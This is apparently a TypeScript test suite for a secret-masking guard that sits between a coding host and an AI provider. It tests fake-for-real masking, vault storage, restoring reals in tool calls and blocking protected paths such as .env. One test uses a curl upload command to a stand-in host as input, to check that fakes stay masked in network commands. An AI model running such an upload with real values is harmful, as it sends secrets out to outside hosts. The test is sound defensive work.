import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  Guard,
  HIDDEN,
  type HostContext,
  type OpenOptions,
  type ToolCall,
} from "../../src/core/guard.ts";
import { Masker } from "../../src/core/masker.ts";

const REAL = "Kx91abQuillHarbor";
/** Too short to learn on its own: only a restore makes a later request mask it. */
const SHORT = "hunterz";
const STORE_PATH = "/srv/host-store/key.json";
const PATHS = {
  rules: [
    { id: "lit", type: "literal", values: [REAL, STORE_PATH] },
    {
      id: "password",
      type: "keyed",
      strategy: "shape",
      keys: ["password"],
      value: "[A-Za-z0-9]{7}",
    },
  ],
};

/** A call whose path the host reads from the input that the guard gives. */
function call(
  id: string,
  tool: string,
  input: Record<string, unknown>,
): ToolCall {
  return {
    id,
    tool,
    input,
    verified: true,
    cwd: "/",
    pathOf: (restored) =>
      typeof restored.path === "string" ? restored.path : undefined,
  };
}

/** The fake of SHORT, learned from a keyed value. */
async function shortFake(guard: Guard): Promise<string> {
  const masked = await guard.maskText(`password=${SHORT}`);
  return masked.slice("password=".length);
}

interface Harness {
  guard: Guard;
  ctx: HostContext & { notices: string[]; aborts: number };
  stateDir: string;
  open(
    config?: unknown,
    host?: Partial<Pick<OpenOptions, "env" | "defaultRules">>,
  ): void;
  /** Another guard, as in another process, on the same machine vault. */
  sibling(config?: unknown): Guard;
}

const guards: Guard[] = [];

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllEnvs();
  for (const guard of guards.splice(0)) guard.close();
});

function newGuard(): Guard {
  const guard = new Guard({
    name: "host-guard",
    tools: ["shell", "read"],
    protectedPaths: ["**/host-store/**"],
    // Like a provider format: masking keeps call ids byte-exact.
    format: { opaque: (key) => key === "id" },
  });
  guards.push(guard);
  return guard;
}

function harness(): Harness {
  const dir = mkdtempSync(join(tmpdir(), "guard-"));
  const stateDir = join(dir, "state");
  const guard = newGuard();
  const ctx = {
    notices: [] as string[],
    aborts: 0,
    ui: {
      notify: (message: string) => {
        ctx.notices.push(message);
      },
    },
    abort: () => {
      ctx.aborts += 1;
    },
  };
  const openOn = (
    target: Guard,
    config: unknown,
    host: Partial<Pick<OpenOptions, "env" | "defaultRules">>,
  ): void => {
    const path = join(dir, "config.json");
    writeFileSync(path, JSON.stringify(config));
    target.open(
      () => ({
        configPaths: [path],
        projectConfigPath: undefined,
        stateDir,
        env: {},
        defaultRules: [],
        ...host,
      }),
      ctx,
    );
  };
  const LITERAL = { rules: [{ id: "lit", type: "literal", values: [REAL] }] };
  return {
    guard,
    ctx,
    stateDir,
    open: (config = LITERAL, host = {}) => openOn(guard, config, host),
    sibling(config = LITERAL) {
      const other = newGuard();
      openOn(other, config, {});
      return other;
    },
  };
}

describe("Guard", () => {
  it("masks text and appends its mapping to the machine vault", async () => {
    const { guard, open, stateDir } = harness();
    open();
    const masked = await guard.maskText(`key ${REAL}`);
    expect(masked).not.toContain(REAL);
    const fake = masked.slice("key ".length);
    expect(readFileSync(join(stateDir, "vault.jsonl"), "utf8")).toContain(fake);
  });

  it("gives a real the same fake in another process and restores it there", async () => {
    const { guard, open, sibling } = harness();
    open();
    const masked = await guard.maskText(`key ${REAL}`);
    const other = sibling();
    expect(other.restoreText(masked)).toBe(`key ${REAL}`);
    expect(await other.maskText(`key ${REAL}`)).toBe(masked);
  });

  it("masks a real that another process learned from its context", async () => {
    const { guard, open, sibling } = harness();
    const config = {
      rules: [
        {
          id: "password",
          type: "keyed",
          strategy: "shape",
          keys: ["password"],
          value: "[A-Za-z0-9]{9}",
        },
      ],
    };
    open(config);
    const other = sibling(config);
    await guard.maskText("password=Lrn8Value");
    expect(await other.maskText("saw Lrn8Value")).not.toContain("Lrn8Value");
  });

  it("blocks on an invalid configuration and reports it once with the host name", async () => {
    const { guard, ctx, open } = harness();
    open({ unknown: 1 });
    await expect(guard.maskText("x")).rejects.toThrow("CONFIG_INVALID");
    guard.report(ctx, "OTHER");
    expect(ctx.notices).toEqual([
      "host-guard: CONFIG_INVALID. Requests that need masking are blocked.",
    ]);
  });

  it("shows one stop notice per open and still shows a later block", async () => {
    const { guard, ctx, open } = harness();
    open();
    guard.report(ctx, "SCAN_TIMEOUT");
    guard.report(ctx, "SCAN_TIMEOUT");
    open({ unknown: 1 });
    expect(ctx.notices).toEqual([
      "host-guard: SCAN_TIMEOUT. The request was stopped. Masking stays on.",
      "host-guard: CONFIG_INVALID. Requests that need masking are blocked.",
    ]);
  });

  it("returns the fail result with the code when the session is blocked", async () => {
    const { guard, ctx } = harness();
    const result = await guard.guarded(
      ctx,
      (_ctx, code) => code,
      async () => "ran",
    );
    expect(result).toBe("NOT_STARTED");
  });

  it("returns the fail result with the code of a throw", async () => {
    const { guard, ctx, open } = harness();
    open();
    const result = await guard.guarded(
      ctx,
      (_ctx, code) => code,
      () => guard.maskPayload({ self: undefined, fn: () => 1 }),
    );
    expect(result).toBe("PAYLOAD_SHAPE");
  });

  it("rejects a payload with the code when the session is blocked, so a caller's catch gets it", async () => {
    const { guard } = harness();
    const masked = guard
      .maskPayload({ text: REAL })
      .catch((error: unknown) => error);
    await expect(masked).resolves.toMatchObject({ code: "NOT_STARTED" });
  });

  it("masks texts in input order and rejects with the code when the session is blocked", async () => {
    const { guard, open } = harness();
    await expect(guard.maskTexts(["x"])).rejects.toMatchObject({
      code: "NOT_STARTED",
    });
    open();
    const masked = await guard.maskTexts(["plain", `key ${REAL}`, "end"]);
    expect(masked[0]).toBe("plain");
    expect(masked[1]).toMatch(/^key /);
    expect(masked[1]).not.toContain(REAL);
    expect(masked[2]).toBe("end");
  });

  it("withholds a payload or header text that hides a real in a reading, as withholdHiddenCopies asks", async () => {
    const { guard, open } = harness();
    const rules = [
      { id: "pw", type: "literal", values: ["Huntr3ss-Fake-9wP"] },
    ];
    open({ rules });
    await guard.maskText("Huntr3ss-Fake-9wP");
    const reversed = "Pw9-ekaF-ss3rtnuH";
    expect(await guard.maskTexts(["plain", reversed])).toEqual([
      "plain",
      HIDDEN,
    ]);
    expect(await guard.maskPayload({ text: reversed })).toEqual({
      text: HIDDEN,
    });
    open({ rules, withholdHiddenCopies: false });
    expect(await guard.maskTexts([reversed])).toEqual([reversed]);
    expect(await guard.maskPayload({ text: reversed })).toEqual({
      text: reversed,
    });
  });

  it("withholds a text with a new token in markdown escapes, as a fetched web page has it", async () => {
    const { guard, open } = harness();
    open();
    const escaped = String.raw`token ghp\_zLysID21rDSHRQwgxvC9BQ1KzisQpN2r6Gcc`;

    expect(await guard.maskPayload({ text: escaped })).toEqual({
      text: HIDDEN,
    });
  });

  it.each([
    String.raw`p4ss\/w0rd+Z&<9xQ`,
    String.raw`p4ss\u002fw0rd+Z\u0026\u003c9xQ`,
    "p4ss/w0rd+Z&amp;&lt;9xQ",
    "p4ss&#x2F;w0rd+Z&#38;&#60;9xQ",
  ])("masks, withholds or refuses a real escaped as %s", async (escaped) => {
    const { guard, open } = harness();
    open({
      rules: [{ id: "pw", type: "literal", values: ["p4ss/w0rd+Z&<9xQ"] }],
    });
    const masked = await guard
      .maskPayload({ text: `{"note":"${escaped}"}` })
      .then(
        (payload) => JSON.stringify(payload),
        (error: unknown) => error,
      );
    expect(masked).not.toEqual(expect.stringMatching(/p4ss|w0rd|9xQ/));
    if (typeof masked !== "string")
      expect(masked).toMatchObject({ code: "HIDDEN_REAL" });
  });

  it("masks a payload and passes it unchanged while masking is off", async () => {
    const { guard, open } = harness();
    open();
    const masked = await guard.maskPayload({ content: REAL });
    expect(JSON.stringify(masked)).not.toContain(REAL);
    guard.setRedaction("off");
    const raw = { content: REAL };
    expect(await guard.maskPayload(raw)).toBe(raw);
  });

  it("fails a bound payload mask once the guard opens again", async () => {
    const { guard, open } = harness();
    open();
    const masker = guard.payloadMasker();
    open();
    await expect(masker.maskPayload({ content: REAL })).rejects.toMatchObject({
      code: "SESSION_CHANGED",
    });
  });

  it("runs masks one at a time", async () => {
    const { guard, open } = harness();
    open();
    const order: string[] = [];
    let release = (): void => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const mask = Masker.prototype.mask;
    // The test seam: holds the first mask open to show that the second waits for it.
    vi.spyOn(Masker.prototype, "mask").mockImplementation(async function (
      this: Masker,
      texts,
      restored,
    ) {
      order.push(`${texts[0]} start`);
      if (texts[0] === "first") await gate;
      const masked = await mask.call(this, texts, restored);
      order.push(`${texts[0]} end`);
      return masked;
    });
    const first = guard.maskTexts(["first"]);
    const second = guard.maskTexts(["second"]);
    await vi.waitFor(() => expect(order).toEqual(["first start"]));
    await new Promise((resolve) => setImmediate(resolve));
    expect(order).toEqual(["first start"]);
    release();
    await Promise.all([first, second]);
    expect(order).toEqual([
      "first start",
      "first end",
      "second start",
      "second end",
    ]);
  });

  it("passes text unchanged while masking is off and reports the status", async () => {
    const { guard, open } = harness();
    open();
    expect(guard.status()).toBe(
      "host-guard: enabled. The provider gets fakes, you see real values.",
    );
    expect(guard.setRedaction("off")).toBe(
      "host-guard: off. The provider gets real values.",
    );
    expect(await guard.maskText(REAL)).toBe(REAL);
    expect(guard.status()).toMatch(/^host-guard: off\./);
    expect(guard.setRedaction("enabled")).toMatch(/^host-guard: enabled\./);
    expect(await guard.maskText(REAL)).not.toBe(REAL);
  });

  it("refuses to change masking or restore text while the session is blocked", () => {
    const { guard } = harness();
    expect(() => guard.setRedaction("off")).toThrow("NOT_STARTED");
    expect(() => guard.restoreText("x")).toThrow("NOT_STARTED");
    expect(guard.status()).toMatch(/^host-guard: blocked \(NOT_STARTED\)\./);
  });

  it("restores the real values of fakes in a text", async () => {
    const { guard, open } = harness();
    open();
    const masked = await guard.maskText(`key ${REAL}`);
    expect(guard.restoreText(masked)).toBe(`key ${REAL}`);
  });

  it("restores a verified tool input, and keeps fakes in a network command or an unverified tool", async () => {
    const { guard, open } = harness();
    open();
    const fake = await guard.maskText(REAL);
    const read = { path: fake };
    expect(guard.restoreCall(call("c1", "read", read))).toEqual({
      blocked: false,
    });
    expect(read.path).toBe(REAL);
    const upload = { command: `curl -d ${fake} example.test` };
    guard.restoreCall({
      ...call("c2", "shell", upload),
      commandKey: "command",
    });
    expect(upload.command).toContain(fake);
    const unknown = { path: fake };
    guard.restoreCall(call("c3", "unknown", unknown));
    expect(unknown.path).toBe(fake);
    const unverified = { path: fake };
    guard.restoreCall({ ...call("c4", "read", unverified), verified: false });
    expect(unverified.path).toBe(fake);
  });

  it("blocks a fake path that restores into a protected path and keeps its fakes", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const fake = await guard.maskText(STORE_PATH);
    // Without the restore, the fake path passes the check.
    expect(
      guard.restoreCall({
        ...call("c0", "read", { path: fake }),
        verified: false,
      }),
    ).toEqual({ blocked: false });
    const input = { path: fake };
    expect(guard.restoreCall(call("c1", "read", input))).toEqual({
      blocked: true,
    });
    expect(input.path).toBe(fake);
  });

  it("masks a call's short restored real in a later payload that holds the call's id", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    guard.restoreCall(call("toolu_1", "read", { path: "a.txt", note: short }));
    const other = { id: "toolu_2", text: `saw ${SHORT}` };
    expect(await guard.maskPayload(other)).toEqual(other);
    const masked = await guard.maskPayload({
      id: "toolu_1",
      text: `saw ${SHORT}`,
    });
    expect(JSON.stringify(masked)).not.toContain(SHORT);
  });

  it("masks a call's short restored real in a payload without the call's id when the host gives the id", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    guard.restoreCall(call("c1|fc_1", "read", { path: "a.txt", note: short }));
    const payload = { call_id: "c1", text: `saw ${SHORT}` };
    expect(await guard.maskPayload(payload)).toEqual(payload);
    const masked = await guard.maskPayload(payload, ["c1|fc_1"]);
    expect(JSON.stringify(masked)).not.toContain(SHORT);
    const summary = guard.payloadMasker(["c1|fc_1"]);
    const later = { call_id: "c1", text: `then ${SHORT}` };
    expect(JSON.stringify(await summary.maskPayload(later))).not.toContain(
      SHORT,
    );
  });

  it("masks a call's short restored real that the input glues to a word", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    const input = { path: "a.txt", note: `${short}_x ${short}é` };
    guard.restoreCall(call("toolu_1", "read", input));
    const masked = await guard.maskPayload({
      id: "toolu_1",
      text: `saw ${input.note}`,
    });
    expect(JSON.stringify(masked)).not.toContain(SHORT);
  });

  it("keeps a word that holds a call's restored real of under four characters", async () => {
    const { guard, open } = harness();
    open({ rules: [{ id: "lit", type: "literal", values: ["Bob"] }] });
    const fake = await guard.maskText("Bob");
    guard.restoreCall(call("toolu_1", "read", { path: "a.txt", note: fake }));
    const masked = await guard.maskPayload({
      id: "toolu_1",
      text: "saw Bobby",
    });
    expect(JSON.stringify(masked)).toContain("saw Bobby");
  });

  it("masks a call's short restored real in another process", async () => {
    const { guard, open, sibling } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    guard.restoreCall(call("toolu_1", "read", { path: "a.txt", note: short }));
    const masked = await sibling(PATHS).maskPayload({
      id: "toolu_1",
      text: `saw ${SHORT}`,
    });
    expect(JSON.stringify(masked)).not.toContain(SHORT);
  });

  it("keeps the fakes of a call whose reals it cannot save", async () => {
    const { guard, open, stateDir } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    writeFileSync(join(stateDir, "vault.lock"), String(process.ppid), {
      mode: 0o600,
    });
    const input = { path: "a.txt", note: short };
    expect(() => guard.restoreCall(call("toolu_1", "read", input))).toThrow(
      expect.objectContaining({ code: "STORE_BUSY" }),
    );
    expect(input.note).toBe(short);
  });

  it("saves nothing for a blocked call", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const short = await shortFake(guard);
    const path = await guard.maskText(STORE_PATH);
    guard.restoreCall(call("toolu_1", "read", { path, note: short }));
    const payload = { id: "toolu_1", text: `saw ${SHORT}` };
    expect(await guard.maskPayload(payload)).toEqual(payload);
  });

  it("shows the user a learned real, and the fake of a value that masking finds only by its key", async () => {
    const { guard, open } = harness();
    open(PATHS);
    const masked = await guard.maskText(`key ${REAL} password=${SHORT}`);
    const short = masked.slice(masked.indexOf("password=") + 9);
    const restorer = guard.textRestorer();
    const reply = `${masked.slice(4, 4 + REAL.length)} then ${short}`;
    const pieces = [reply.slice(0, 5), reply.slice(5, 12), reply.slice(12)];
    expect(
      pieces.map((piece) => restorer.push(piece)).join("") + restorer.end(),
    ).toBe(`${REAL} then ${short}`);
  });

  it("protects the host's own files also when the guard is blocked", () => {
    const { guard } = harness();
    const blocked = (path: string): boolean =>
      guard.restoreCall(call("c1", "read", { path })).blocked;
    expect(blocked("/x/host-store/a.json")).toBe(true);
    expect(blocked("/x/.env")).toBe(true);
    expect(blocked("/x/readme.md")).toBe(false);
  });

  it("blocks when the machine vault is not private", async () => {
    const { guard, ctx, open, stateDir } = harness();
    open();
    await guard.maskText(REAL);
    chmodSync(join(stateDir, "vault.jsonl"), 0o644);
    open();
    await expect(guard.maskText("x")).rejects.toThrow("STORE_UNSAFE");
    expect(ctx.notices).toEqual([
      "host-guard: STORE_UNSAFE. Requests that need masking are blocked.",
    ]);
  });

  it("blocks the session when its open options throw", async () => {
    const { guard, ctx } = harness();
    guard.open(() => {
      throw new Error("unreadable");
    }, ctx);
    await expect(guard.maskText("x")).rejects.toThrow("UNEXPECTED_ERROR");
    expect(ctx.notices).toEqual([
      "host-guard: UNEXPECTED_ERROR. Requests that need masking are blocked.",
    ]);
  });

  it("learns env values from the open options, not from the process", async () => {
    const { guard, open } = harness();
    vi.stubEnv("HOST_GUARD_PROCESS", "Pr0cessOnlyValue77");
    open(
      {
        rules: [
          {
            id: "e",
            type: "env",
            vars: ["HOST_GUARD_TOKEN", "HOST_GUARD_PROCESS"],
          },
        ],
      },
      { env: { HOST_GUARD_TOKEN: "0ptionTokenValue42" } },
    );
    const masked = await guard.maskText(
      "a 0ptionTokenValue42 b Pr0cessOnlyValue77",
    );
    expect(masked).not.toContain("0ptionTokenValue42");
    expect(masked).toContain("Pr0cessOnlyValue77");
  });

  it("masks the host's default rules under the configuration", async () => {
    const { guard, open } = harness();
    open(
      {},
      {
        defaultRules: [
          {
            id: "host-id",
            type: "literal",
            enabled: true,
            strategy: "mask",
            values: ["Hostowner7Name"],
          },
        ],
      },
    );
    expect(await guard.maskText("by Hostowner7Name")).not.toContain(
      "Hostowner7Name",
    );
  });

  it("fails every mask after close", async () => {
    const { guard, open } = harness();
    open();
    guard.close();
    await expect(guard.maskText("x")).rejects.toThrow("SESSION_SHUTDOWN");
  });
});
